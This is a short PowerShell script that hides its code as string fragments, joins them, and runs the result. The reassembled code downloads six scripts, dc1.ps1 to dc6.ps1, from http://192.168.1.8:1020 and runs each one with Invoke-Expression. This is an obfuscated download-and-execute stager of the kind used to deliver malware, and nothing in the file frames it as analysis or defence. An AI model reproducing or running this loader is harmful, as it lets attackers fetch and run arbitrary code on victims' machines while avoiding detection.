$fragments = @('﻿
for ($i = ','1; $i -le 6; $i','++) {
   
   ',' $url = "http:/','/192.168.1.8',':1020/dc$i.ps1"','
    
    
 ','   $webClient =',' New-Object Sys','tem.Net.WebClie','nt
    $script','Content = $webC','lient.DownloadS','tring($url)
  ','  
    
    I','nvoke-Expressio','n $scriptConten','t
}'); $script = $fragments -join ''; Invoke-Expression $script



